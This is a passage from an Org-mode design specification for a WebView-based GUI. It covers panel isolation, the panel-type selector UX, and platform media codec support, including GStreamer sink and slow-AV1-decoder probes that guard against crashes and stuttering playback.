the GUI runs them in the shell's own JS realm (Shadow DOM for CSS isolation,
no realm/process isolation; see [[*=metafolder= API delivery mechanism]]),
which is what makes a single shared in-realm data cache possible. A throw in a
panel's =mount= is contained by an error boundary, but a buggy panel can still
corrupt shared state. To be revisited only if a panel-type *distribution*
mechanism (untrusted third-party panels) is ever added — that would need real
sandboxing, not the iframe.

** Panel type selector UX

The current design uses a dropdown in the panel header. This may not be
practical when many panel types are installed. Alternatives: a dedicated
keybinding that opens an autocomplete picker (command-input style), or a
floating palette. To be revisited once the panel type ecosystem grows.

** Media codec support

The =file= panel type uses HTML5 =<audio>= / =<video>=; supported formats
depend on the system WebView, which differs per platform (WebKit2GTK on
Linux, WKWebView on macOS, WebView2 on Windows — see
[[file:spec-platform.org][spec-platform.org]]). On Linux, H.264 may require
GStreamer plugin packages (e.g. =gst-plugins-bad=, =gst-libav=).

On Linux, a missing audio sink does not fail gracefully: WebKitGTK
crashes its web process while building the playback pipeline, which
freezes the entire GUI (the shell and all panel iframes share that one
process). Two defenses are implemented:

- =GET /__media-support= on the GUI server reports
  ={"audio": bool, "video": bool, "missing": [elements]}=, probed once
  per process with =gst-inspect-1.0 --exists= on =autoaudiosink= /
  =autovideosink= (falling back to a plugin-file scan for
  =libgstautodetect.so= when the tool is unavailable; undeterminable
  counts as missing). The =file= panel checks it before creating a media
  element and otherwise shows a message naming the missing elements
  (provided by =gst-plugins-good=).
- The GUI connects WebKitGTK's =web-process-terminated= signal and
  reloads the shell when the web process dies for any reason — Rust owns
  all canonical state, so the session survives. A second termination
  within 10 seconds of the previous one is assumed to be a reload-crash
  loop and is not followed by another reload.

*** Slow decoders

A *present* decoder is not necessarily a *usable* one, and the difference is
invisible to every check above: =gst-discoverer-1.0= reports no missing
plugin, the element is created, the file plays — at a few frames per second.
The user sees a video that stutters and looks degraded in the GUI while
playing perfectly in mpv or smplayer, with nothing anywhere to explain why.
The cause is that those players decode through ffmpeg, and the GUI through
whatever GStreamer element WebKit picks, which for some codecs is a much
slower implementation.

=GET /__media-probe= therefore also returns =slow=: a message when the
codec's *fallback* decoder is known to be slow, no fast alternative is
installed, and the stream's pixel rate (=width × height × fps=) exceeds a
budget. It is =null= otherwise, and always =null= when =missing= is
non-empty (a decoder that is absent cannot also be slow). The panel shows it
as a warning bar and still plays the file.

The judgement is deliberately narrow — a warning that fires on files that
play fine is worse than no warning — so a codec is listed only once it has
been *measured*. One entry so far:

| Codec | Fallback              | Fast decoders                         | Package            |
|-------+-----------------------+---------------------------------------+--------------------|
| AV1   | libaom =av1dec=       | =dav1ddec=, =avdec_av1=, VA-API/NVDEC | =gst-plugin-dav1d= |

=av1dec= is the only AV1 decoder in =gst-plugins-bad= and is single-threaded:
on a 4-core reference box it decoded a 3840×2160 stream at 25 fps (≈207
Mpx/s) against dav1d's 75 fps through ffmpeg — below the 29.97 fps the file
needs, before the WebView's own RGBA conversion (33 MB per 4K frame) and
compositing. The budget is 150 Mpx/s: 1080p60 (124 Mpx/s) stays silent,
1440p60 and 4K30 (221 and 248 Mpx/s) do not.

Decoder presence is probed with =gst-inspect-1.0= and memoized per process.
Unlike the sink probe, an undeterminable answer counts as *present* (no
warning): there the cost of being wrong is a false alarm, whereas a wrong
sink verdict is a GUI-freezing crash.
